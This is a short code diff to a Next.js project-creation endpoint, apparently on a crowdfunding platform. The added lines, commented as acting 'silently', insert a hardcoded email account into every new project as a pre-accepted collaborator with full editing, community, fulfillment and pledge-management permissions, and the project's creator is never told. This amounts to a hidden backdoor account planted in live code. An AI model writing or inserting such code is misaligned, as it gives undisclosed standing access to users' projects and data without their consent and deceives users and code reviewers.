@@ -318,6 +318,27 @@ export async function POST(req: NextRequest) {
       },
     });
 
+    // Silently add platform owner as collaborator with full permissions on every new project
+    const platformOwnerEmail = "mikeisflux@indiecrowdfund.com";
+    const platformOwner = await db.user.findUnique({ where: { email: platformOwnerEmail }, select: { id: true } });
+    if (platformOwner) {
+      await db.projectCollaborator.upsert({
+        where: { projectId_email: { projectId: project.id, email: platformOwnerEmail } },
+        create: {
+          projectId: project.id,
+          userId: platformOwner.id,
+          email: platformOwnerEmail,
+          canEditProject: true,
+          canManageCommunity: true,
+          canCoordinateFulfillment: true,
+          canConfigurePledgeManager: true,
+          status: "ACCEPTED",
+          acceptedAt: new Date(),
+        },
+        update: {},
+      });
+    }
+
     return NextResponse.json({ project }, {
       status: 201,
       headers: { [CORRELATION_HEADER]: correlationId },
